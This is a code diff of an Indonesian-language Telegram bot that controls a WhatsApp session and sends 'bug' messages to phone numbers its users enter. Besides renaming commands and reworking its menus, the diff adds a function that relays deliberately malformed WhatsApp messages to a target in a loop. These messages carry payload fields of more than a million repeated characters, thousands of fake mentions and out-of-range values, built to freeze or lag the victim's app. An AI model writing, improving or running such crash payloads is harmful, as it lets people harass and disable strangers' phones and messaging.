@@ -16,7 +16,7 @@
   
   if (module.parent !== null && module.parent !== undefined) {
     console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
-    console.error('[!] Pareparent.filename)
+    console.error('[!] Parent: ' + module.parent.filename)
     console.error('[!] Akses ditolak - Process dihentikan\n')
     
     try { process.exit(1) } catch(e) {}
@@ -757,7 +757,7 @@ const startSesi = async () => {
 ///////////////////////////////////////////////////
 const checkWhatsAppConnection = (ctx, next) => {
   if (!isWhatsAppConnected) {
-    return ctx.reply("🪧 Sender tidak terhubung, Silahkan /addbot terlebih dahulu untuk Menghubungkan sender kembali");
+    return ctx.reply("🪧 Sender tidak terhubung, Silahkan /connect terlebih dahulu untuk Menghubungkan sender kembali");
   }
   return next();
 };
@@ -1184,50 +1184,29 @@ bot.action("xsettings", async (ctx) => {
 ◇ System    : Auto-Update
 ◇ Language  : JavaScript
 ◇ Framework : Telegraf
-╭═───⊱<strong>⚙️ XSETTINGS MENU</strong>───═⬡
-│ ⸙ /update 
-│ ᯓ➤ Auto Update Script (Only Owner Acces)
-│ ⸙ /addbot 62xxxx
-│ ᯓ➤ Add sender Number
-│ ⸙ /addprem
-│ ᯓ➤ Add Premium Acces User
-│ ⸙ /delprem
-│ ᯓ➤ Delete Premium Acces User
-│ ⸙ /addadmin
-│ ᯓ➤ Add Admin Acces User 
-│ ⸙ /deladmin
-│ ᯓ➤ Delete Admin Acces User
-│ ⸙ /addgrouppremium
-│ ᯓ➤ Add Premium Group
-│ ⸙ /delgrouppremium
-│ ᯓ➤ Delete Premium Group
-│ ⸙ /setcd
-│ ᯓ➤ Setting Cooldown Command Bugs
-│ ⸙ /anticulik
-│ ᯓ➤ Anti Culik Bot To Unknown Groups
-│ ⸙ /addsafe
-│ ᯓ➤ Forget It
-│ ⸙ /delsafe
-│ᯓ➤ Can Be Accessed By Anyone
-│ ⸙ /self
-│ ᯓ➤ Owner Only Mode
-│ ⸙ /public
-│ ᯓ➤ Bot Public Can Acces All User
-│ ⸙ /groupon
-│ ᯓ➤ Mode Group On
-│ ⸙ /groupoff
-│ ᯓ➤ Mode Group Off
-│ ⸙ /antifoto 
-│ ᯓ➤ Block Send Foto
-│ ⸙ /antivideo
-│ ᯓ➤ Block Send Video
-│ ⸙ /runtime
-│ ᯓ➤ Check Run How long Script
-│ ⸙ /mode
-│ ᯓ➤ Mode Bot On/Off
-│ ⸙ /cekowner
-│ ᯓ➤ Check Id Owner
-╰═─────────────═⬡
+<blockquote>☾. ⬡═―⊱「 ⚙️ 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
+ ⸙ /update
+ ⸙ /connect 
+ ⸙ /addprem   
+ ⸙ /delprem
+ ⸙ /addadmin 
+ ⸙ /deladmin
+ ⸙ /addgrouppremium
+ ⸙ /delgrouppremium    
+ ⸙ /setcd    
+ ⸙ /anticulik
+ ⸙ /addsafe    
+ ⸙ /delsafe
+ ⸙ /self
+ ⸙ /public    
+ ⸙ /groupon    
+ ⸙ /groupoff
+ ⸙ /antifoto    
+ ⸙ /antivideo
+ ⸙ /runtime
+ ⸙ /mode    
+ ⸙ /cekowner
+<blockquote>═─────────────═⬡</blockquote>
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
 
@@ -1355,7 +1334,7 @@ async function showxbugs(ctx, page = 1) {
 <blockquote>☾. ⬡═―⊱「 🚀 DELAY TYPE 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
 ◇ /Xdelay   62xxx  → Delay Hard Visible
 ◇ /Xbug    62xxx  → Invisible Delay
-◇ /Xqoya   62xxx  → Delay Bebas Spam
+◇ /Xoya   62xxx  → Delay Bebas Spam For Murbug
 
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
@@ -2204,7 +2183,7 @@ bot.command("connect", checkOwner, async (ctx) => {
 
     const args = ctx.message.text.split(" ");
     if (args.length < 2) {
-      return ctx.reply("Example:\n/addbot 628xxxx");
+      return ctx.reply("Example:\n/connect 628xxxx");
     }
 
     let phoneNumber = args[1].replace(/[^0-9]/g, "");
@@ -2216,7 +2195,7 @@ bot.command("connect", checkOwner, async (ctx) => {
 
     
     if (phoneNumber.length < 8 || phoneNumber.length > 15) {
-      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/addbot 628xxxx");
+      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
     }
 
     await new Promise(r => setTimeout(r, 1000));
@@ -2274,7 +2253,7 @@ bot.command("killsesi", checkOwner, async (ctx) => {
     global.pairingMessage = null;
 
     if (deleted) {
-      ctx.reply("🗑️ Session dihapus, silakan /addbot kembali");
+      ctx.reply("🗑️ Session dihapus, silakan /connect kembali");
     } else {
       ctx.reply("⚠️ Session tidak ditemukan");
     }
@@ -2334,10 +2313,10 @@ bot.command("Xbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
   })();
 });
 /// ============= CASE BUG 3 BEBAS SPAM=============\\\
-bot.command("Xqoya", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
+bot.command("Xoya", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
 
   const q = ctx.message.text.split(" ")[1]; 
-  if (!q) return ctx.reply("🪧 ☇ Example : /Xqoya 62xx");
+  if (!q) return ctx.reply("🪧 ☇ Example : /Xoya 62xx");
 
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
@@ -2347,15 +2326,15 @@ bot.command("Xqoya", checkAllPremium, checkWhatsAppConnection, checkCooldown, as
 ◇ 📤 Target : ${q}
 ◇ 🦋 Type : DELAY BEBAS SPAM
 ◇ ☘️ Loop : Sedang Memasak
-◇ ⚙️ Command : Xqoya
+◇ ⚙️ Command : Xqoya Bugs
 ◇ ⚡ Status : Success✅</pre>`,
     { parse_mode: "HTML" }
   );
 
   (async () => {
-    for (let i = 0; i < 20; i++) {
-      await DelayInvis(sock, target);
-      await sleep(2000);
+    for (let r = 0; r < 8; r++) {
+      await SukaSukaDiley(sock, target);
+      await sleep(1000);
     }
   })();
 });
@@ -2643,6 +2622,175 @@ async function PaysQl(socket, target) {
 
     await sleep(1500)
   }
+}
+
+async function SukaSukaDiley(sock, target) {
+    try {
+        await sock.relayMessage(
+            target,
+            {
+                groupStatusMessageV2: {
+                    message: {
+                        extendedTextMessage: {
+                            text: "$",
+                            matchedText: "https://t.me/maklubang",
+                            description: "$",
+                            title: "$",
+                            paymentLinkMetadata: {
+                                button: {
+                                    displayText: "#",
+                                },
+                                header: {
+                                    headerType: 1,
+                                },
+                                provider: {
+                                    paramsJson: "{{".repeat(120000),
+                                },
+                            },
+                            linkPreviewMetadata: {
+                                paymentLinkMetadata: {
+                                    button: {
+                                        displayText: "@jule",
+                                    },
+                                    header: {
+                                        headerType: 1,
+                                    },
+                                    provider: {
+                                        paramsJson: "{{".repeat(120000),
+                                    },
+                                },
+                                urlMetadata: {
+                                    fbExperimentId: 999,
+                                },
+                                fbExperimentId: 888,
+                                linkMediaDuration: 555,
+                                socialMediaPostType: 1221,
+                                videoContentUrl: "https://wa.me/settings/linked_devices#,,jule",
+                                videoContentCaption: "@jule",
+                            },
+                            contextInfo: {
+                                isForwarded: true,
+                                forwardingScore: 999,
+                                quotedMessage: {
+                                    locationMessage: {
+                                        degreesLatitude: 9.999999919991,
+                                        degreesLongitude: -999999999999,
+                                        accuracyInMeters: 1
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            },
+            { participant: { jid: target } }
+        );
+        
+        let parse = true;
+        let SID = "5e03e0";
+        let key = "10000000_2203140470115547_947412155165083119_n.enc";
+        let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
+        let type = `image/webp`;
+        if (11 > 9) {
+            parse = parse ? false : true;
+        }
+
+        const stc = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    stickerMessage: {
+                        url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
+                        fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
+                        fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
+                        mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
+                        mimetype: type,
+                        directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
+                        fileLength: {
+                            low: Math.floor(Math.random() * 1000),
+                            high: 0,
+                            unsigned: true,
+                        },
+                        mediaKeyTimestamp: {
+                            low: Math.floor(Math.random() * 1700000000),
+                            high: 0,
+                            unsigned: false,
+                        },
+                        firstFrameLength: 19904,
+                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
+                        isAnimated: true,
+                        contextInfo: {
+                            participant: target,
+                            mentionedJid: [
+                                "0@s.whatsapp.net",
+                                ...Array.from(
+                                    { length: 1900 },
+                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                                ),
+                            ],
+                            groupMentions: [],
+                            entryPointConversionSource: "non_contact",
+                            entryPointConversionApp: "whatsapp",
+                            entryPointConversionDelaySeconds: 467593,
+                        },
+                        stickerSentTs: {
+                            low: Math.floor(Math.random() * -20000000),
+                            high: 555,
+                            unsigned: parse,
+                        },
+                        isAvatar: parse,
+                        isAiSticker: parse,
+                        isLottie: parse,
+                    },
+                },
+            },
+        }, {});
+
+        const jawir = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "#",
+                            format: "DEFAULT"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "galaxy_message",
+                            paramsJson: "\x10".repeat(1045000),
+                            version: 3
+                        },
+                        entryPointConversionSource: "call_permission_request"
+                    },
+                },
+            },
+        }, {
+            ephemeralExpiration: 0,
+            forwardingScore: 9741,
+            isForwarded: true,
+            font: Math.floor(Math.random() * 99999999),
+            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
+        });
+
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: stc.message,
+            },
+        }, {
+            messageId: stc.key.id,
+            participant: { jid: target },
+        });
+
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: jawir.message,
+            },
+        }, {
+            messageId: jawir.key.id,
+            participant: { jid: target },
+        });
+
+    } catch (err) {
+        console.error("error:", err);
+    }
 }
 
 // --- Jalankan Bot --- //
